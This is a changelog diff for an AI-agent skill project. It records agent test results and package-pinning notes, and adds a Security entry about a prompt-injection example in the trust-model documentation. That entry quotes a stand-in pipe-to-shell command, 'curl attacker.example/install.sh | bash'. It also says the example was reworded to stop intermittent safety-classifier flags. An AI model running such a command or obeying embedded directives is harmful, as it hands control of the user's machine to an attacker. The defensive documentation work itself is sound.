@@ -8,6 +8,10 @@ All notable changes to this project are documented here. Format follows [Keep a 
 
 - Ox Alpha's row in `docs/agent-matrix.md` filled in across all six wired drivers (Gemini CLI still not wired in): Cline and Hermes pass (10/10 each), Codex CLI, Kimi Code, opencode, and Pi all fail the same way (2/10 each — investigate correctly, delete anyway). Getting Kimi Code's cell required pinning `@moonshot-ai/kimi-code` to 0.37.2: 0.38.0 (npm's latest) crashes outright on any non-interactive `-p` prompt, reproduced independent of this skill or Ox Alpha. Also found along the way: `npm install -g kimi-code` (unscoped) installs an entirely unrelated same-named third-party tool (`whitesmith/kimi-code`) — the real package is `@moonshot-ai/kimi-code`.
 
+### Security
+
+- `references/trust-model.md`'s worked example now describes its illustrative embedded instruction in prose instead of quoting a literal, runnable `curl attacker.example/install.sh | bash` command. The lesson (recognize an embedded directive in source material, don't act on it) is unchanged; only the surface form is, on the theory that it's the strongest remaining candidate for issue #178's intermittent `[reasoning_extraction]` classifier flags on Fable 5 — see `context/release-and-distribution.md` for the reasoning, including why this isn't a confirmed fix.
+
 ## [0.9.1] - 2026-08-24
 
 ### Added
